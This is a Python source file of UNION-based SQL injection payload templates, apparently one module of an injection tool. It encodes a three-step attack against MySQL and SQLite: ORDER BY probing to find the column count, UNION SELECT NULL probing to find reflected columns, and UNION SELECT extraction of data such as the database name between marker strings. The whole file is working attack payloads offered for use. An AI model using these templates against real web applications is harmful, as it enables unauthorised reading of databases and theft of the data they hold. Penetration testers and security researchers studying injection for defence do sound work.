"""
payloads/union_based.py — UNION-based injection payload templates (Phase 3 & 4)

Purpose:
  Payloads that append a UNION SELECT to an existing query so that the
  injected data is returned inline in the normal response body.

Steps encoded in these payloads:
  1. Column count discovery      → ORDER BY N --   (increment N until error)
  2. Visible column detection    → UNION SELECT NULL, NULL, ...  (find string columns)
  3. Data retrieval              → UNION SELECT {DATA}, NULL, ... --

Placeholder convention:
  {N}    → column count integer, e.g. 3
  {DATA} → the expression or sub-query whose result we want to extract
  {PAD}  → NULL padding to match column count, e.g. "NULL,NULL"

Syntax is compatible with both MySQL and SQLite.

Expected exports:
  ORDER_BY_TMPL   : str   — template for column-count probing
  UNION_NULL_TMPL : str   — template for visible-column detection
  UNION_DATA_TMPL : str   — template for data extraction
"""

# Step 1 — Column count discovery.
# Inject increasing values of N until the server returns an error.
# The last N that did NOT error is the column count of the original query.
# Example rendered payload:  1' ORDER BY 3-- -
ORDER_BY_TMPL: str = "1' ORDER BY {N}-- -"

# Step 2 — Visible column detection.
# Replace one NULL at a time with a string marker to discover which
# position is reflected in the HTTP response body.
# {PAD} must contain exactly (column_count - 1) NULLs separated by commas.
# Example rendered payload:  1' UNION SELECT NULL,NULL-- -
UNION_NULL_TMPL: str = "1' UNION SELECT {PAD}-- -"

# Step 3 — Data extraction.
# Place the target expression in the visible column position; pad the rest
# with NULLs so the column count matches the original query.
# {DATA}  → e.g. CONCAT('VXSTART', DATABASE(), 'VXEND')
# {PAD}   → e.g. NULL   (one NULL when the query has 2 columns total)
# Example rendered payload:  1' UNION SELECT CONCAT('S',DATABASE(),'E'),NULL-- -
UNION_DATA_TMPL: str = "1' UNION SELECT {DATA},{PAD}-- -"